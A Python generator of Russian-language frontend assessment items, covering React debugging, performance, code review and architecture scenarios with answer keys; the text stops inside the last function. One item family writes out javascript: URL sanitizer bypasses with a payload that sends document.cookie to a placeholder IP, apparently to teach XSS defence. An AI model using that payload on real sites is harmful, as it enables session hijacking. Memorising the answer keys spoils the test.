"""Frontend, «Неделя до релиза»: сценарные семейства с логами консоли, графиками метрик и кодом компонентов.
По 3 семейства на компетенцию сверх простых шаблонов items.py; a, b — экспертная оценка до калибровки.
У каждого семейства три варианта механики (items._variant), правильные ответы других вариантов — среди дистракторов."""

from app.services.items import _log, _options, _variant, family

# --- Отладка UI ---


@family("fe_dbg_undefined", "Frontend", "Отладка UI", "choice", 2.2, -0.3)
def _(rng):
    comp, res = rng.choice([("ProductList", "products"), ("OrderTable", "orders"), ("ReviewFeed", "reviews"), ("CartItems", "cart")])
    s, ms = rng.randint(10, 50), rng.randint(240, 900)
    n = rng.randint(12, 80)
    v = _variant(rng, 3)
    err, body, state = [("Cannot read properties of undefined (reading 'map')", f"[{n} items]", "useState()"),
                        (f"{res}.map is not a function", f'{{"items": [{n} items], "total": {n * 7}}}', "useState([])"),
                        ("Cannot read properties of null (reading 'name')", f"[{n} items, у {rng.randint(1, 3)} из них author: null]", "useState([])")][v]
    net = _log(f"10:{s:02d}:02.{ms:03d}", "network", "INFO", f"GET /api/{res} 200 ({ms + 900} ms), body: {body}")
    # v0 падает на первом рендере, до ответа API; v1 и v2 — уже на пришедших данных, после ответа
    err_t = (1, 204) if v == 0 else (2, ms + 30)
    lines = [
        _log(f"10:{s:02d}:01.020", "vite", "INFO", f"page reload src/pages/{comp}.tsx"),
        *([] if v == 0 else [net]),
        _log(f"10:{s:02d}:{err_t[0]:02d}.{err_t[1]:03d}", "console", "ERROR", f"Uncaught TypeError: {err}\n    at {comp} ({comp}.tsx:{rng.randint(14, 40)}:{rng.randint(12, 30)})"),
        _log(f"10:{s:02d}:{err_t[0]:02d}.{err_t[1] + 1:03d}", "console", "WARN", f"The above error occurred in the <{comp}> component"),
        *([net] if v == 0 else []),
    ]
    opts, key = _options(rng, ["Первый рендер идёт до ответа API: состояние undefined — задать [] или показывать загрузку",
                               f"API /api/{res} вернул объект с полем items, а не массив: брать data.items",
                               "У части элементов автора нет (null): обработать отсутствующие данные — опциональная цепочка и заглушка"], v,
                         ["Vite не пересобрал модуль после изменения файла: нужен полный перезапуск dev-сервера с очисткой кэша",
                          "У элементов списка нет key, поэтому React не может отрисовать map"])
    return {"scene_title": "Белый экран", "story": f"Понедельник. Экран {comp} падает при открытии. Состояние объявлено как {state}, данные грузятся в useEffect.",
            "prompt": "Почему компонент падает?", "panel": {"type": "logs", "lines": lines}, "options": opts, "key": key}


@family("fe_dbg_hydration", "Frontend", "Отладка UI", "choice", 2.3, 1.1)
def _(rng):
    city, off = rng.choice([("Москвы", 3), ("Екатеринбурга", 5), ("Новосибирска", 7), ("Владивостока", 10)])
    day, h, m = rng.randint(1, 28), rng.randint(0, 12), rng.randint(0, 59)
    comp = rng.choice(["DeliveryDate", "OrderCard", "SlotPicker"])
    v = _variant(rng, 3)
    mismatch = [f'Text content did not match. Server: "{day:02d}.10.2026, {h:02d}:{m:02d}" Client: "{day:02d}.10.2026, {h + off:02d}:{m:02d}"',
                f'Prop `id` did not match. Server: "field-{rng.randint(1000, 9999)}" Client: "field-{rng.randint(1000, 9999)}"',
                'Text content did not match. Server: "Войти" Client: "Привет, Анна"'][v]
    story = [f"Пользователи из {city} жалуются: время доставки на секунду показывается одно, потом меняется.",
             "После перехода на SSR поля формы теряют связь с подписями, а консоль сыплет ошибками гидрации.",
             "Залогиненные пользователи на мгновение видят «Войти» вместо своего имени — имя хранится в localStorage."][v]
    lines = [_log("14:32:07", "browser", "WARN", f"Warning: {mismatch}\n    at {comp}"),
             _log("14:32:07", "browser", "ERROR", "Error: Hydration failed because the initial UI does not match what was rendered on the server."),
             _log("14:32:07", "browser", "WARN", "There was an error while hydrating. Switched to client rendering."),
             _log("14:32:08", "ssr", "INFO", f"GET /orders/{rng.randint(10000, 99999)} 200 render {rng.randint(40, 120)} ms (node, container ssr-{rng.randint(1, 4)})")]
    opts, key = _options(rng, ["Дата форматируется в часовом поясе процесса, а у сервера и браузера он разный: задать timeZone явно",
                               "id генерируется Math.random при каждом рендере: на сервере и в браузере он разный — использовать useId",
                               "Рендер читает localStorage, которого нет на сервере: читать его в useEffect после гидрации"], v,
                         ["CDN отдал закэшированный HTML от прошлой выкладки, поэтому серверная разметка устарела",
                          "Сервер рендеринга и браузер используют разные версии React: пересобрать серверный бандл с общим lock-файлом"])
    return {"scene_title": "Гидрация", "story": f"{story} В консоли — ошибка гидрации.", "prompt": "В чём причина?", "panel": {"type": "logs", "lines": lines}, "options": opts, "key": key}


@family("fe_dbg_race", "Frontend", "Отладка UI", "mark", 2.3, 1.9)
def _(rng):
    comp, res, q1, q2 = rng.choice([("ProductSearch", "products", "ноут", "ноутбук"), ("CitySearch", "cities", "Ново", "Новосибирск"),
                                    ("UserSearch", "users", "ива", "иванова")])
    v = _variant(rng, 3)
    lines = [f"function {comp}() {{", '  const [query, setQuery] = useState("");', "  const [items, setItems] = useState([]);"]
    if v == 2:
        lines.append("  const [filters, setFilters] = useState({ page: 1, sort: \"relevance\" });")
    if rng.random() < 0.5:
        lines.append("  const { t } = useTranslation();")
    if v == 0:
        lines += ["", "  useEffect(() => {", f"    fetch(`/api/{res}?q=${{encodeURIComponent(query)}}`)", "      .then((r) => r.json())",
                  "      .then((data) => setItems(data));"]
        key = [len(lines), len(lines) + 1]
        lines += ["  }, [query]);", "", "  return <Results items={items} onSearch={setQuery} />;", "}"]
        story = f"Если быстро набрать «{q2}», под строкой поиска иногда остаются результаты для «{q1}». Сервер отвечает на запросы за разное время."
        prompt = "Нажмите на строку, из-за которой на экране остаются результаты устаревшего запроса."
    elif v == 1:
        lines += ["", "  const search = (q) =>", f"    fetch(`/api/{res}?q=${{encodeURIComponent(q)}}`).then((r) => r.json()).then(setItems);",
                  "  const debouncedSearch = debounce(search, 300);"]
        key = len(lines)
        lines += ["", "  const onChange = (q) => { setQuery(q); debouncedSearch(q); };", "  return <Results items={items} onSearch={onChange} />;", "}"]
        story = f"Поиск с задержкой 300 мс: пока набираешь «{q2}», запрос должен уйти один. В DevTools — запрос на каждую букву."
        prompt = "Нажмите на строку, из-за которой задержка не работает."
    else:
        lines += ["", "  useEffect(() => {", "    setFilters({ ...filters, page: 1 });"]
        key = [len(lines), len(lines) + 1]
        lines += ["  }, [filters]);", "", "  return <Results items={items} filters={filters} onFilters={setFilters} />;", "}"]
        story = f"Экран {comp} зависает при открытии, в консоли: «Maximum update depth exceeded»."
        prompt = "Нажмите на строку, из-за которой компонент перерисовывается бесконечно."
    return {"scene_title": "Поиск барахлит", "story": story, "prompt": prompt, "panel": {"type": "code", "lang": "tsx", "lines": lines}, "key": key}


@family("fe_dbg_url_scheme", "Frontend", "Отладка UI", "choice", 2.3, 2.75)
def _(rng):
    field, role, role_by = rng.choice([("website", "модератора", "модератором"), ("portfolio", "рекрутера", "рекрутером"),
                                       ("homepage", "администратора", "администратором")])
    host = f"203.0.113.{rng.randint(2, 250)}"
    v = _variant(rng, 3)
    if v == 0:
        # санитайзер по чёрному списку и обход, который он пропускает: таб внутри схемы, регистр, управляющий символ в начале
        check, payload, patch = rng.choice([
            ('raw.trim().toLowerCase().startsWith("javascript:")', "java\\tscript:", "Заменить trim() на replace(/\\s+/g, \"\") — других способов обойти проверку нет"),
            ('raw.replace(/\\s+/g, "").startsWith("javascript:")', "JavaScript:", "Добавить toLowerCase() перед startsWith — после этого чёрный список закрывает схему полностью"),
            ('/^javascript:/i.test(raw.replace(/\\s+/g, ""))', "\\x01javascript:", "Регулярка без флага m не видит перевод строки: добавить флаг m, и проверка станет надёжной"),
        ])
        lines = ["function safeHref(raw: string): string {", f'  if ({check}) return "#";', "  return raw;", "}", "",
                 f'<a href={{safeHref(profile.{field})}} target="_blank" rel="noopener">Сайт</a>',
                 f'// в базе: profile.{field} = "{payload}fetch(\'//{host}/?c=\'+document.cookie)"']
        story = f"Клик по ссылке «Сайт» в анкете выполнил скрипт в сессии {role}. Санитайзер ссылок на ревью выглядел нормально."
    elif v == 1:
        patch = "Проверять расширение файла: принимать только .png, .jpg и .svg"
        lines = ["// загрузка аватара", 'if (!["image/png", "image/jpeg", "image/svg+xml"].includes(file.type)) throw new Error("bad type");',
                 "await upload(`/media/avatars/${user.id}`, file);", "", "// отдача: тот же домен, что и приложение", "// GET /media/avatars/<id> → Content-Type из загрузки, без Content-Disposition"]
        story = f"Аватар из анкеты, открытый {role_by} по прямой ссылке в новой вкладке, выполнил скрипт в его сессии. Загружаются только картинки."
    else:
        patch = "Проверять event.data.type строже: принимать только тип setToken и токен нужного формата"
        lines = ['window.addEventListener("message", (event) => {', '  if (event.data?.type === "setToken") {', "    widget.setToken(event.data.token);", "  }", "});",
                 "", "// виджет оплаты открывается во всплывающем окне и сообщает токен обратно через postMessage"]
        story = f"Сторонняя страница, открытая из нашего приложения, подменила токен платёжного виджета в сессии {role}."
    opts, key = _options(rng, ["Чёрный список обходится нормализацией URL: пускать только http/https по new URL(raw).protocol",
                               "SVG — документ со скриптами: пользовательские файлы отдавать с отдельного домена и с Content-Disposition: attachment",
                               "Обработчик postMessage принимает сообщения от любого окна: проверять event.origin по белому списку"], v,
                         [patch, "Без noreferrer ссылка с target=_blank исполняется в контексте страницы — добавить rel=\"noopener noreferrer\""])
    return {"scene_title": "Скрипт в чужой сессии", "story": story, "prompt": "Почему защита не сработала и как исправить надёжно?",
            "panel": {"type": "code", "lang": "tsx", "lines": lines}, "options": opts, "key": key}


# --- Производительность ---


@family("fe_perf_lcp", "Frontend", "Производительность", "choice", 2.1, -1.3)
def _(rng):
    d0, rel = rng.randint(1, 20), rng.randint(3, 5)
    w, hgt, mb = rng.choice([(3840, 1600), (4000, 2000), (5120, 2160)]) + (rng.choice([4.2, 4.8, 5.6]),)
    x = [f"{d0 + i:02d}.10" for i in range(8)]
    lcp = [rng.randint(1800, 2300) if i < rel else rng.randint(5200, 6400) for i in range(8)]
    v = _variant(rng, 3)
    mark, name, mx, data, story = [
        ("новый баннер", "вес главной, МБ", 10, [round(rng.uniform(1.2, 1.6), 1) if i < rel else round(mb + rng.uniform(1.2, 1.6), 1) for i in range(8)],
         f"Маркетинг заменил баннер на главной на PNG {w}×{hgt}. С этого дня LCP вырос почти втрое, остальной код не менялся."),
        ("виджет чата", "синхронный JS в <head>, КБ", 1000, [rng.randint(60, 90) if i < rel else rng.randint(700, 900) for i in range(8)],
         "В <head> главной подключили виджет онлайн-чата обычным тегом script. С этого дня LCP вырос почти втрое."),
        ("ленивые картинки", "старт загрузки баннера, мс от начала", 6000, [rng.randint(200, 400) if i < rel else rng.randint(3800, 5200) for i in range(8)],
         "Чтобы ускорить сайт, всем картинкам, включая баннер на первом экране, добавили loading=\"lazy\". С этого дня LCP вырос почти втрое."),
    ][v]
    panel = {"type": "chart", "x": x, "marker": {"i": rel, "label": mark}, "series": [
        {"name": "LCP p75 главной, мс", "axis": "left", "max": 8000, "data": lcp}, {"name": name, "axis": "right", "max": mx, "data": data}]}
    opts, key = _options(rng, ["Пережать баннер в AVIF/WebP и отдавать по srcset картинку под ширину экрана",
                               "Подключать скрипт виджета с async или после загрузки страницы: сейчас он блокирует отрисовку",
                               "Убрать loading=\"lazy\" с баннера первого экрана и дать ему fetchpriority=\"high\""], v,
                         ["Добавить всем изображениям decoding=\"sync\", чтобы они отрисовывались сразу", "Включить HTTP/2 push для баннера, чтобы он приходил вместе с HTML"])
    return {"scene_title": "Медленная главная", "story": story, "prompt": "Что сделать в первую очередь?", "panel": panel, "options": opts, "key": key}


@family("fe_perf_context", "Frontend", "Производительность", "choice", 2.2, 1.1)
def _(rng):
    prov, ctx, q, s = rng.choice([("FiltersProvider", "FiltersContext", "query", "sort"), ("CatalogProvider", "CatalogContext", "search", "category"),
                                  ("TableProvider", "TableContext", "filter", "columns")])
    n = rng.choice([2000, 3000, 5000])
    cap = q[0].upper() + q[1:]
    v = _variant(rng, 3)
    if v == 0:
        lines = [f"export function {prov}({{ children }}) {{", f'  const [{q}, set{cap}] = useState("");', f"  const [{s}, set{s.capitalize()}] = useState(null);"]
        if rng.random() < 0.5:
            lines.append("  const user = useCurrentUser();")
        lines += ["  return (", f"    <{ctx}.Provider value={{{{ {q}, set{cap}, {s}, set{s.capitalize()} }}}}>",
                  "      {children}", f"    </{ctx}.Provider>", "  );", "}", "", f"// DataTable: const {{ {s} }} = useContext({ctx});"]
        story = f"Каждый символ в поле поиска перерисовывает все {n} строк DataTable, хотя таблица использует только {s}. Ввод заметно запаздывает."
    elif v == 1:
        lines = ["const Row = React.memo(function Row({ item, onSelect, style }) { /* … */ });", "", "function DataTable({ items, select }) {",
                 "  return items.map((item) => (", "    <Row key={item.id} item={item}", "         onSelect={() => select(item.id)}",
                 "         style={{ height: 40 }} />", "  ));", "}"]
        story = f"Строки DataTable обёрнуты в React.memo, но при любом изменении над таблицей все {n} строк всё равно перерисовываются."
    else:
        lines = ["function App() {", f'  const [{q}, set{cap}] = useState("");', "  return (", "    <Layout>", f"      <SearchInput value={{{q}}} onChange={{set{cap}}} />",
                 "      <Sidebar />", f"      <DataTable rows={{rows}} />  {{/* {n} строк, {q} не использует */}}", "    </Layout>", "  );", "}"]
        story = f"Каждый символ в поле поиска перерисовывает всё приложение, включая DataTable на {n} строк, которой {q} не нужен."
    opts, key = _options(rng, [f"Таблица подписана на весь контекст: вынести {q} в отдельный контекст и мемоизировать value",
                               "React.memo не помогает: в пропсы каждый раз приходят новые функция и объект — стабилизировать их (useCallback, константа)",
                               "Состояние поля поднято в корень: держать его в самом поле или рядом, чтобы ввод не перерисовывал всё приложение"], v,
                         ["Заменить useState на useReducer: тогда React перестанет перерисовывать потребителей при каждом вводе",
                          "Это особенность dev-сборки: в production React не перерисовывает такие компоненты"])
    return {"scene_title": "Ввод тормозит", "story": story, "prompt": "Что исправить?", "panel": {"type": "code", "lang": "tsx", "lines": lines}, "options": opts, "key": key}


@family("fe_perf_inp", "Frontend", "Производительность", "choice", 2.3, 2.1)
def _(rng):
    d0, rel = rng.randint(1, 20), rng.randint(2, 4)
    ms, n = rng.randint(550, 900), rng.choice([30, 50, 80])
    x = [f"{d0 + i:02d}.10" for i in range(8)]
    inp = [rng.randint(110, 180) if i < rel else rng.randint(520, 760) for i in range(8)]
    v = _variant(rng, 3)
    mark, name, mx, data, story = [
        ("релиз фильтров", "долгих задач за сессию", 40, [rng.randint(2, 5) if i < rel else rng.randint(18, 30) for i in range(8)],
         f"После релиза фильтров вырос INP. В профиле: клик «Применить» запускает одну задачу на {ms} мс — синхронная фильтрация и сортировка {n} тыс. товаров, затем рендер."),
        ("релиз анимации карточек", "принудительных перерасчётов layout за клик", 400, [rng.randint(1, 3) if i < rel else rng.randint(200, 380) for i in range(8)],
         f"После релиза анимации карточек вырос INP. В профиле клика — сотни коротких Recalculate Style / Layout: цикл по {n} карточкам читает offsetHeight и сразу пишет style.height."),
        ("подключён A/B-сервис", "долгих задач стороннего скрипта за сессию", 40, [0 if i < rel else rng.randint(15, 25) for i in range(8)],
         f"После подключения внешнего сервиса A/B-тестов вырос INP. В профиле клика — задача на {ms} мс в его скрипте: он синхронно пересчитывает свои правила на каждый клик."),
    ][v]
    panel = {"type": "chart", "x": x, "marker": {"i": rel, "label": mark}, "series": [
        {"name": "INP p75 каталога, мс", "axis": "left", "max": 1000, "data": inp}, {"name": name, "axis": "right", "max": mx, "data": data}]}
    opts, key = _options(rng, ["Сначала отрисовать отклик на клик, а сортировку дробить с уступкой потоку или увести в Web Worker",
                               "Чтения и записи layout чередуются в цикле: сначала прочитать все размеры, потом записать все стили",
                               "Сторонний скрипт держит главный поток: грузить его отложенно и снять его синхронные обработчики кликов"], v,
                         ["Обернуть обработчик клика в requestAnimationFrame: тяжёлая работа уйдёт с главного потока в отдельный кадр",
                          "Включить will-change: transform для таблицы, чтобы браузер рендерил её на GPU"])
    return {"scene_title": "Отклик на клик", "story": story, "prompt": "Как вернуть отзывчивость?", "panel": panel, "options": opts, "key": key}


@family("fe_perf_leak", "Frontend", "Производительность", "choice", 2.4, 2.5)
def _(rng):
    a, b = rng.choice([("Заказы", "Отчёты"), ("Сделки", "Аналитика"), ("Задачи", "Календарь")])
    v = _variant(rng, 3)
    if v == 0:
        # подписка, которую не снимают, и косвенная улика: число слушателей растёт с каждым переключением вкладок
        sub, clue = rng.choice([
            ("ResizeObserver", "в Performance monitor число активных ResizeObserver растёт на один при каждом переключении"),
            ('Обработчик window.addEventListener("resize")', "getEventListeners(window).resize в консоли растёт на один при каждом переключении"),
            ("Подписка на общую шину событий", "bus.listenerCount(\"update\") растёт на один при каждом переключении"),
        ])
        story = f"Операторы весь день переключают вкладки «{a}» ↔ «{b}». Через полчаса интерфейс вязнет; в снимке кучи — {rng.randint(8, 30) * 1000} Detached HTMLDivElement, {clue}."
    else:
        sub = "Подписка на события"
        story = [None, f"Операторы весь день открывают карточки во вкладке «{a}». Через полчаса интерфейс вязнет; detached-узлов нет, в снимке кучи растёт Map в модуле cardCache — "
                       f"по записи на каждую открытую карточку, {rng.randint(3, 9)} тыс. записей.",
                 f"Операторы весь день загружают фото документов во вкладке «{a}» и смотрят превью. Через полчаса интерфейс вязнет; detached-узлов нет, "
                 f"в chrome://blob-internals — {rng.randint(400, 900)} blob-объектов по 3–8 МБ."][v]
    x = [f"{5 * i} мин" for i in range(8)]
    heap = [round(60 + i * rng.uniform(38, 46)) for i in range(8)]
    inp = [rng.randint(90, 130) + i * rng.randint(45, 60) for i in range(8)]
    panel = {"type": "chart", "x": x, "series": [{"name": "память вкладки, МБ (RUM)", "axis": "left", "max": 500, "data": heap},
                                                 {"name": "INP p75, мс", "axis": "right", "max": 600, "data": inp}]}
    opts, key = _options(rng, [f"{sub} не снимается в cleanup эффекта и держит отсоединённые узлы",
                               "Кэш карточек растёт без предела: ограничить размер (LRU) или время жизни записей",
                               "Превью создаются через URL.createObjectURL и не освобождаются: вызывать URL.revokeObjectURL"], v,
                         [f"Таблица во вкладке «{b}» не виртуализирована: тысячи узлов делают каждый кадр тяжёлым — виртуализировать",
                          "Detached-узлы и объекты держит React DevTools у операторов: в проде без расширения утечки нет"])
    return {"scene_title": "Тормозит к обеду", "story": story, "prompt": "В чём причина?", "panel": panel, "options": opts, "key": key}


# --- Ревью кода ---


@family("fe_rv_xss", "Frontend", "Ревью кода", "mark", 2.2, -1.0)
def _(rng):
    comp, ent, who = rng.choice([("Comment", "comment", "комментариев"), ("Review", "review", "отзывов"), ("Message", "message", "сообщений в чате")])
    v = _variant(rng, 3)
    if v == 0:
        lines = [f"function {comp}({{ {ent} }}) {{", "  return (", f'    <article className="{ent}">', f"      <b>{{{ent}.author}}</b>"]
        if rng.random() < 0.5:
            lines.append(f"      <time>{{formatDate({ent}.createdAt)}}</time>")
        lines.append(f"      <div dangerouslySetInnerHTML={{{{ __html: {ent}.text }}}} />")
        key = len(lines)
        lines += [f"      <Likes count={{{ent}.likes}} />", "    </article>", "  );", "}"]
        story, caption = f"Стажёр сделал вывод {who} с сохранением форматирования. Текст пишут сами пользователи. Ревью за вами.", f"форматирование {who}"
    elif v == 1:
        lines = ["function ReportCell({ row, column }) {", "  // формулы колонок пользователи пишут сами: «price * qty»", "  const value = useMemo(() => {",
                 "    const fn = new Function(...Object.keys(row), `return ${column.formula};`);"]
        key = len(lines)
        lines += ["    return fn(...Object.values(row));", "  }, [row, column.formula]);", "  return <td>{value}</td>;", "}"]
        story, caption = "Стажёр сделал пользовательские формулы в отчётах; отчёты с формулами можно расшаривать коллегам. Ревью за вами.", "формулы в отчётах"
    else:
        lines = ["function LoginSuccess() {", "  const params = new URLSearchParams(location.search);", "  useEffect(() => {"]
        if rng.random() < 0.5:
            lines.append('    analytics.track("login_success");')
        lines.append('    window.location.href = params.get("next") || "/";')
        key = len(lines)
        lines += ["  }, []);", "  return <Spinner />;", "}"]
        story, caption = "Стажёр сделал возврат пользователя на нужную страницу после входа. Ревью за вами.", "редирект после входа"
    return {"scene_title": "Ревью стажёра", "story": story, "prompt": "Нажмите на строку с уязвимостью.",
            "panel": {"type": "code", "lang": "tsx", "lines": lines, "caption": f"PR #{rng.randint(300, 899)} · «{caption}»"}, "key": key}


@family("fe_rv_stale_closure", "Frontend", "Ревью кода", "mark", 2.2, 0.9)
def _(rng):
    comp, label, start = rng.choice([("BookingTimer", "до конца брони", 600), ("OtpCountdown", "до повторной отправки кода", 60), ("PaymentTimer", "на оплату", 900)])
    v = _variant(rng, 3)
    if v == 0:
        lines = [f"function {comp}() {{", f"  const [seconds, setSeconds] = useState({start});"]
        if rng.random() < 0.5:
            lines.append("  const format = useDurationFormat();")
        lines += ["", "  useEffect(() => {", "    const id = setInterval(() => {", "      setSeconds(seconds - 1);"]
        key = [len(lines), len(lines) + 3]
        lines += ["    }, 1000);", "    return () => clearInterval(id);", "  }, []);", "", "  return <span>{seconds}</span>;", "}"]
        story = f"Таймер «{label}» показывает {start}, затем {start - 1} и замирает, хотя интервал продолжает срабатывать каждую секунду."
    elif v == 1:
        modal = rng.choice(["Modal", "Drawer", "Lightbox"])
        lines = [f"function {modal}({{ onClose, children }}) {{", "  useEffect(() => {", '    const onKey = (e) => e.key === "Escape" && onClose();',
                 '    document.addEventListener("keydown", onKey);']
        key = len(lines)
        lines += ["  }, [onClose]);", "", '  return <div role="dialog">{children}</div>;', "}"]
        story = "После нескольких открытий окна одно нажатие Esc вызывает onClose по три-четыре раза, в том числе у уже закрытых окон."
    else:
        lines = ["function ClickCounter() {", "  const clicks = useRef(0);"]
        if rng.random() < 0.5:
            lines.append("  const format = useDurationFormat();")
        lines += ["  const onClick = () => {", "    clicks.current += 1;"]
        key = [2, len(lines), len(lines) + 3]  # useRef вместо useState, мутация без рендера, вывод ref
        lines += ["    console.log(clicks.current);", "  };", "  return <button onClick={onClick}>Нажатий: {clicks.current}</button>;", "}"]
        story = "Счётчик нажатий на экране всегда показывает 0, хотя в консоли значение растёт."
    return {"scene_title": "Хуки ведут себя странно", "story": story, "prompt": "Нажмите на строку с причиной.", "panel": {"type": "code", "lang": "tsx", "lines": lines}, "key": key}


@family("fe_rv_refresh", "Frontend", "Ревью кода", "mark", 2.3, 2.0)
def _(rng):
    cl, n = rng.choice(["api", "http", "client"]), rng.randint(4, 8)
    v = _variant(rng, 3)
    lines = [f"{cl}.interceptors.response.use(undefined, async (error) => {{", "  const original = error.config;"]
    if rng.random() < 0.5:
        lines.append("  // повторяем запрос с новым токеном")
    if v == 1:
        lines.append("  if (error.response?.status !== 401) throw error;")
        key = len(lines)  # refresh помечен _retry, но условие флаг не проверяет: 401 самого refresh снова запускает refresh
    else:
        lines += ["  if (error.response?.status !== 401 || original._retry) throw error;", "  original._retry = true;"]
    lines.append(f'  const tokens = await {cl}.post("/auth/refresh", {{ token: getRefreshToken() }}, {{ _retry: true }}).then((r) => r.data);' if v == 1 else
                 "  const tokens = await auth.refresh(getRefreshToken());")
    if v == 0:
        key = len(lines)
    lines.append("  saveTokens({ access: tokens.access });" if v == 2 else "  saveTokens(tokens);")
    if v == 2:
        key = len(lines)
    lines += ["  original.headers.Authorization = `Bearer ${tokens.access}`;", f"  return {cl}(original);", "});"]
    story = [f"Refresh-токен одноразовый: сервер выдаёт новый и отзывает старый. Когда access-токен истекает, дашборд с {n} параллельными запросами выкидывает пользователя на логин.",
             "Когда истекает и refresh-токен, вкладка зависает: в Network — тысячи запросов /auth/refresh подряд, каждый с ответом 401.",
             "Refresh-токен одноразовый: сервер выдаёт новый и отзывает старый. Первое истечение access-токена проходит незаметно, а при втором пользователя выкидывает на логин."][v]
    prompt = "Нажмите на строку, из-за которой вкладка уходит в бесконечные запросы." if v == 1 else "Нажмите на строку, из-за которой пользователя разлогинивает."
    return {"scene_title": "Обновление токена", "story": story, "prompt": prompt,
            "panel": {"type": "code", "lang": "ts", "lines": lines, "caption": f"PR #{rng.randint(300, 899)} · «автообновление токена»"}, "key": key}


@family("fe_rv_cached_reject", "Frontend", "Ревью кода", "mark", 2.3, 2.6)
def _(rng):
    fn, api, typ = rng.choice([("loadSuggest", "/api/suggest", "Suggestion"), ("loadPrices", "/api/prices", "Price"), ("loadProfile", "/api/profiles", "Profile")])
    v = _variant(rng, 3)
    lines = [f"const cache = new Map<string, Promise<{typ}[]>>();"]
    if v == 2:
        key = len(lines)
    lines.append("")
    if rng.random() < 0.5:
        lines.append("// запрос дедуплицируется: одинаковые ключи ждут один и тот же промис")
    lines.append(f"export function {fn}(q: string, locale: string): Promise<{typ}[]> {{")
    lines.append("  const key = q;" if v == 1 else "  const key = `${locale}:${q}`;")
    if v == 1:
        key = len(lines)
    lines += ["  if (!cache.has(key)) {"]
    if v == 2:
        key = [1, len(lines)]  # кэш без срока жизни: сама Map и проверка has без учёта возраста записи
    if v == 0:
        lines.append(f"    cache.set(key, fetch(`{api}?q=${{encodeURIComponent(q)}}&lang=${{locale}}`).then(r => {{")
        key = len(lines)
        lines += ["      if (!r.ok) throw new Error(`HTTP ${r.status}`);", "      return r.json();", "    }));"]
    else:
        lines += [f"    const p = fetch(`{api}?q=${{encodeURIComponent(q)}}&lang=${{locale}}`).then(r => {{", "      if (!r.ok) throw new Error(`HTTP ${r.status}`);",
                  "      return r.json();", "    });", "    p.catch(() => cache.delete(key));", "    cache.set(key, p);"]
    lines += ["  }", "  return cache.get(key)!;", "}"]
    m = rng.randint(2, 6)
    story = [f"Сервис {api} лежал {m} {'минуты' if m < 5 else 'минут'} и отвечал 503. Он давно поднялся, но для части ключей {fn} до перезагрузки вкладки возвращает ошибку.",
             f"Пользователь переключил язык интерфейса, а {fn} для уже введённых запросов продолжает возвращать данные на прежнем языке.",
             f"Данные {api} поменялись час назад, а {fn} до перезагрузки вкладки отдаёт старые; вкладку операторы не закрывают днями."][v]
    return {"scene_title": "Кэш запросов", "story": story, "prompt": "Нажмите на строку с причиной.",
            "panel": {"type": "code", "lang": "ts", "lines": lines, "caption": f"PR #{rng.randint(500, 999)} · «дедупликация {fn}»"}, "key": key}


# --- Архитектура клиента ---


@family("fe_arch_drilling", "Frontend", "Архитектура клиента", "choice", 2.1, -1.1)
def _(rng):
    prop, what = rng.choice([("theme", "тема оформления"), ("locale", "язык интерфейса"), ("currency", "валюта цен")])
    v = _variant(rng, 3)
    if v == 0:
        tags = ["App", "Layout", "Sidebar", "Menu", "MenuItem", "Badge"][: rng.randint(5, 6)]
        lines = [f"{'  ' * i}<{t} {prop}={{{prop}}}{' />' if i == len(tags) - 1 else '>'}" for i, t in enumerate(tags)]
        story = f"Настройку «{what}» передают пропсами через {len(tags)} уровней. Половина компонентов её не использует, только передаёт дальше."
    elif v == 1:
        lines = ["// store/index.ts", "export const store = configureStore({ reducer: {", "  user, cart, catalog,",
                 "  loginFormEmail, loginFormPassword, searchInputValue, isPromoTooltipOpen, …", "} });"]
        story = "В глобальном store лежит всё, включая текст в полях форм и открыт ли тултип. Любое нажатие клавиши проходит через весь store и devtools."
    else:
        lines = ["// OrdersPage.tsx, ReportsPage.tsx, DashboardWidget.tsx — одинаковый код:", "const [orders, setOrders] = useState([]);",
                 "const [loading, setLoading] = useState(true);", "useEffect(() => { fetch('/api/orders').then(r => r.json()).then(setOrders).finally(() => setLoading(false)); }, []);"]
        story = "Загрузка заказов скопирована в три компонента; ошибку обработки поправили в одном и забыли в двух."
    opts, key = _options(rng, [f"Положить {prop} в контекст на верхнем уровне и читать там, где он нужен",
                               "Локальное состояние форм и UI держать в компонентах, в глобальном store — только общее для приложения",
                               "Вынести загрузку в общий хук useOrders и использовать его во всех трёх местах"], v,
                         ["Записать всё в window и читать оттуда в любом компоненте", "Слить компоненты в один большой, чтобы не делиться кодом и данными"])
    return {"scene_title": "Устройство клиента", "story": story, "prompt": "Как сделать проще?", "panel": {"type": "code", "lang": "tsx", "lines": lines}, "options": opts, "key": key}


@family("fe_arch_dedupe", "Frontend", "Архитектура клиента", "choice", 2.2, 0.2)
def _(rng):
    widgets = rng.sample(["Header", "Sidebar", "ProfileMenu", "Notifications", "CartBadge", "Greeting"], 4)
    s, t = rng.randint(10, 50), 100
    v = _variant(rng, 3)
    lines = []
    if v == 0:
        for w in widgets:
            t += rng.randint(5, 40)
            lines.append(_log(f"Вт 11:{s:02d}:00.{t:03d}", "network", "INFO", f"GET /api/me 200 ({rng.randint(120, 300)} ms) initiator: {w}.tsx"))
        for w in rng.sample(widgets, 2):
            t += rng.randint(5, 40)
            lines.append(_log(f"Вт 11:{s:02d}:00.{t:03d}", "network", "INFO", f"GET /api/cart 200 ({rng.randint(150, 400)} ms) initiator: {w}.tsx"))
        story = "Главная грузится медленно. В DevTools одни и те же запросы уходят по несколько раз: каждый виджет сам загружает данные в useEffect."
    elif v == 1:
        for api in ["/api/me", "/api/cart", "/api/recommendations", "/api/banners"]:
            ms = rng.randint(250, 400)
            lines.append(_log(f"Вт 11:{s:02d}:{t // 1000:02d}.{t % 1000:03d}", "network", "INFO", f"GET {api} 200 ({ms} ms) — начат после завершения предыдущего"))
            t += ms + rng.randint(5, 20)
        story = "Главная грузится медленно. Каждый из четырёх запросов уходит только после ответа предыдущего, хотя они друг от друга не зависят."
    else:
        mb = rng.randint(4, 9)
        lines = [_log(f"Вт 11:{s:02d}:00.120", "network", "INFO", f"GET /api/orders 200 ({mb}.{rng.randint(1, 9)} MB, {rng.randint(1800, 3200)} ms)"),
                 _log(f"Вт 11:{s:02d}:03.400", "console", "INFO", f"orders: {rng.randint(15, 40)} 000 записей × 60 полей; таблица показывает 20 строк и 5 колонок")]
        story = "Страница заказов грузится несколько секунд даже на хорошем интернете."
    lines.append(_log(f"Вт 11:{s:02d}:04.{rng.randint(100, 900):03d}", "lighthouse", "WARN", f"Time to Interactive {rng.randint(4, 7)}.{rng.randint(0, 9)} s"))
